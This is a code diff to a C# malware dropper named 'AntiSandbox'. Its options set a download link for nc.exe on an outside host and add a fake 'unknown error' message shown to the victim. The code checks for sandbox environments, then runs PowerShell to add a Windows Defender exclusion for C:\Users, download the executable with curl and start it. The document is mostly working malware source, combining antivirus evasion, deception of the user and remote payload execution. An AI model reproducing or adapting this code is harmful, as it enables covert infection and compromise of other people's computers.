@@ -14,12 +14,16 @@ namespace AntiSandbox
 
             ///////////////////////////////
             ///     --- OPTIONS---     ///
-            bool dev = true;                          // Enable/Disable devmode
-            string link = "https://iiii.lol/nc.exe";        // Set link to get file for dropper
-            string name = "nc.exe";               // Set filename (saved as & executed as)
+            bool dev = false;                         
+            bool fakem = true;
+            string message = "An unknown error appeared. Please try again"; 
+            string link = "https://iiii.lol/nc.exe";
+            string name = "nc.exe";                   
             ///     --- OPTIONS---     ///
            ///////////////////////////////
 
+
+            // Debug/Dev mode 
             if (dev == true)
             {
                 Console.Clear();
@@ -256,6 +260,7 @@ namespace AntiSandbox
                     Console.ReadKey();
                 }
             }
+            // Release mode 
             if (dev == false)
             {
                 bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
@@ -295,6 +300,12 @@ namespace AntiSandbox
                     Console.WriteLine("Unable to start Application (Error: 4)! Exiting in 5 seconds."); // Error 4 = Keine Tastatur gefunden (Possible Sandbox enviroment)
                     Thread.Sleep(5000);
                     return;
+                }
+
+                if (fakem == true)
+                {
+                    Console.WriteLine(message);
+                    Console.ReadKey();
                 }
 
                 Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl " + link + " -outfile " + name + "; start C:\\Users\\" + name + "");
